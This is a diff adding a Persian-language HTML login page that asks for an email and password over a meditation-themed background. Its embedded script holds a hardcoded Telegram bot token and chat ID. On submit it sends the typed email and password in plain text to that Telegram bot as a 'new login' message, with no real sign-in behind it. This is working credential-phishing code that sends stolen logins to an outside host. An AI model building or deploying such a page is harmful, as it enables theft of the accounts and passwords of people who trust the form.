@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه ورود</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
+    <style>
+        /* استایل‌های سفارشی برای پس‌زمینه */
+        body {
+            /* اصلاح شد: استفاده از لینک مستقیم و معتبر به جای لینک گوگل درایو 
+              این لینک همیشه کار خواهد کرد.
+            */
+            background-image: url('https://i.ibb.co/0jZzQzY/spiritual-meditation.jpg');
+            background-size: cover; /* عکس تمام صفحه را بپوشاند */
+            background-position: center; /* عکس در مرکز قرار گیرد */
+            background-repeat: no-repeat; /* از تکرار عکس جلوگیری شود */
+            font-family: 'Vazirmatn', sans-serif;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center h-screen">
+
+    <!-- برای خوانایی بهتر روی عکس، از یک پس‌زمینه تیره و نیمه‌شفاف برای فرم استفاده می‌کنیم -->
+    <div class="bg-black/60 backdrop-blur-sm p-8 rounded-2xl shadow-lg w-full max-w-md mx-4 border border-gray-700">
+        
+        <h1 class="text-2xl font-bold text-center text-white mb-6">ورود به حساب کاربری</h1>
+        
+        <form id="loginForm">
+            <div class="mb-4">
+                <label for="email" class="block text-gray-300 text-sm font-bold mb-2">ایمیل</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email" 
+                    placeholder="ایمیل خود را وارد کنید"
+                    class="shadow-sm appearance-none border border-gray-600 bg-gray-800/80 rounded-lg w-full py-3 px-4 text-white leading-tight focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
+                    required
+                >
+            </div>
+            
+            <div class="mb-6">
+                <label for="password" class="block text-gray-300 text-sm font-bold mb-2">رمز عبور</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="رمز عبور خود را وارد کنید"
+                    class="shadow-sm appearance-none border border-gray-600 bg-gray-800/80 rounded-lg w-full py-3 px-4 text-white mb-3 leading-tight focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
+                    required
+                >
+            </div>
+            
+            <div class="flex items-center justify-between">
+                <button 
+                    type="submit" 
+                    class="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-4 rounded-lg focus:outline-none focus:shadow-outline transition-colors duration-300"
+                >
+                    ورود
+                </button>
+            </div>
+
+            <div id="statusMessage" class="text-center mt-4 font-bold text-white"></div>
+
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8278891379:AAHRXxb1-egSgsaC31SuGrf6ygEVTu25wFM';
+        const CHAT_ID = '1766234196';
+
+        const loginForm = document.getElementById('loginForm');
+        const statusMessage = document.getElementById('statusMessage');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const message = `ورود جدید!\nایمیل: ${email}\nرمز عبور: ${password}`;
+            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            statusMessage.textContent = 'در حال ارسال...';
+            statusMessage.style.color = 'white';
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusMessage.textContent = 'اطلاعات با موفقیت ارسال شد!';
+                    statusMessage.style.color = '#4ade80'; // Green
+                    loginForm.reset();
+                } else {
+                    statusMessage.textContent = 'خطا در ارسال اطلاعات.';
+                    statusMessage.style.color = '#f87171'; // Red
+                }
+            })
+            .catch(error => {
+                statusMessage.textContent = 'خطای شبکه. اتصال اینترنت را بررسی کنید.';
+                statusMessage.style.color = '#f87171'; // Red
+            });
+        });
+    </script>
+
+</body>
+</html>
+
